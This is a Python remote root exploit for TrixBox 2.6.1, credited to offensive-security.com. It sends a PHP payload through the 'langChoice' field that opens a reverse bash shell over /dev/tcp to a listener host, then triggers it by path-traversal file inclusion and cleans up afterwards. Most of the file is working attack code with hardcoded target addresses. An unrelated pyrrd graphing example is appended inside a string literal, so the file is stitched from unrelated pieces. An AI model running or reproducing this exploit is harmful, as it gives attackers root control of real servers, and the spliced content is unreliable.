#!/usr/bin/python
# TrixBox 2.6.1 langChoice remote root exploit
# muts from offensive-security.com
# chris from offensive-security.com
# All credits to Jean-Michel BESNARD <jmbesnard@gmail.com>
# Same same, but different.
# http://www.offensive-security.com/0day/trixbox.py.txt
##################################################################################################
# id
# uid=0(root) gid=0(root) 
#groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
# uname -a
# Linux trixbox1.localdomain 2.6.25.7 #4 SMP Tue Jun 17 19:35:11 EDT 2008 i686 i686 i386 GNU/Linux
##################################################################################################

import sys
from socket import *
import re
import os
from time import sleep

print ("[*] BY THE POWER OF GRAYSKULL - I HAVE THE ROOTZ0R!\r\n"
"[*] TrixBox 2.6.1 langChoice remote root exploit \r\n"
"[*] http://www.offensive-security.com/0day/trixbox.py.txt\r\n")
"""
if (len(sys.argv)!=5):
	print "[*] Usage: %s <rhost> <rport> <lhost> <lport>" %sys.argv[0]
	exit(0)
	
host=sys.argv[1]
port=int(sys.argv[2])
lhost=sys.argv[3]
lport=int(sys.argv[4])
"""
host="10.35.71.5"
port=int("80")
lhost="172.16.5.129"
lport=int("80")

def create_post(injection):
        buffer=("POST /user/index.php HTTP/1.1 \r\n"
        "Host: 172.16.5.129 \r\n"
        "Content-Type: application/x-www-form-urlencoded \r\n"
        "Content-Length: "+str(len(injection))+"\r\n\r\n" +injection)
        return buffer


def send_post(host,port,input):
	s = socket(AF_INET, SOCK_STREAM)
	s.connect((host, port))
	s.send(input)
	output=s.recv(1024)
	s.close()
	return output

def find_sessionid(http_output):
    headers=re.split("\n",http_output)
    for header in headers:
        if re.search("Set-Cookie",header):
            cook=header.split(" ")
            sessionid=cook[1][10:42]
            print "[*] Session ID is %s" % sessionid
            return sessionid


print "[*] Injecting reverse shell into session file"
bash_inject="langChoice=<?php shell_exec(\"sudo /bin/bash 0</dev/tcp/"+lhost+"/"+str(lport)+" 1>%260 2>%260\");?>" 
reverse=create_post(bash_inject)
raw_session=send_post(host,port,reverse)

print "[*] Extracting Session ID"
id=find_sessionid(raw_session)

print "[*] Triggering Reverse Shell to %s %d in 3 seconds" %(lhost,lport)
sleep(3)
print "[*] Skadush! \r\n[*] Ctrl+C to exit reverse shell."
tmpsession=create_post('langChoice=../../../../../../../../../../tmp/sess_'+id+'%00')


send_post(host,port,tmpsession)

print "[*] Cleaning up"
cleanup=create_post('langChoice=Spanish')
send_post(host,port,cleanup)
send_post(host,port,cleanup)
print "[*] Done!"


"""
from pyrrd.rrd import RRD, RRA, DS
from pyrrd.graph import DEF, CDEF, VDEF
from pyrrd.graph import LINE, AREA, GPRINT
from pyrrd.graph import ColorAttributes, Graph

#exampleNum = 2
path = '/Users/brur/Desktop/'
filename = path+'example2.rrd'
graphfile = path+'example2.png'
#filename = path+'example%s.rrd' % exampleNum
#graphfile = path+'example%s.png' % exampleNum

# Let's create and RRD file and dump some data in it
dss = []
rras = []
ds1 = DS(dsName='speed', dsType='COUNTER', heartbeat=600)
dss.append(ds1)
rra1 = RRA(cf='AVERAGE', xff=0.5, steps=1, rows=24)
rra2 = RRA(cf='AVERAGE', xff=0.5, steps=6, rows=10)
rras.extend([rra1, rra2])
myRRD = RRD(filename, ds=dss, rra=rras, start=920804400)
myRRD.create()
myRRD.bufferValue('920805600', '12363')
myRRD.bufferValue('920805900', '12363')
myRRD.bufferValue('920806200', '12373')
myRRD.bufferValue('920806500', '12383')
myRRD.bufferValue('920806800', '12393')
myRRD.bufferValue('920807100', '12399')
myRRD.bufferValue('920807400', '12405')
myRRD.bufferValue('920807700', '12411')
myRRD.bufferValue('920808000', '12415')
myRRD.bufferValue('920808300', '12420')
myRRD.bufferValue('920808600', '12422')
myRRD.bufferValue('920808900', '12423')
myRRD.update()

# Let's set up the objects that will be added to the graph
def1 = DEF(rrdfile=myRRD.filename, vname='myspeed', dsName=ds1.name)
cdef1 = CDEF(vname='kmh', rpn='%s,3600,*' % def1.vname)
cdef2 = CDEF(vname='fast', rpn='kmh,100,GT,kmh,0,IF')
cdef3 = CDEF(vname='good', rpn='kmh,100,GT,0,kmh,IF')
vdef1 = VDEF(vname='mymax', rpn='%s,MAXIMUM' % def1.vname)
vdef2 = VDEF(vname='myavg', rpn='%s,AVERAGE' % def1.vname)
line1 = LINE(value=100, color='#990000', legend='Maximum Allowed')
area1 = AREA(defObj=cdef3, color='#006600', legend='Good Speed')
area2 = AREA(defObj=cdef2, color='#CC6633', legend='Too Fast')
line2 = LINE(defObj=vdef2, color='#000099', legend='My Average', stack=True)
gprint1 = GPRINT(vdef2, '%6.2lf kph')

# Let's configure some custom colors for the graph
ca = ColorAttributes()
ca.back = '#333333'
ca.canvas = '#333333'
ca.shadea = '#000000'
ca.shadeb = '#111111'
ca.mgrid = '#CCCCCC'
ca.axis = '#FFFFFF'
ca.frame = '#AAAAAA'
ca.font = '#FFFFFF'
ca.arrow = '#FFFFFF'

# Now that we've got everything set up, let's make a graph
g = Graph(graphfile, start=920805000, end=920810000, vertical_label='km/h', color=ca)
g.data.extend([def1, cdef1, cdef2, cdef3, vdef1, vdef2, line1, area1, area2, line2, gprint1])
g.write(debug=True)
"""

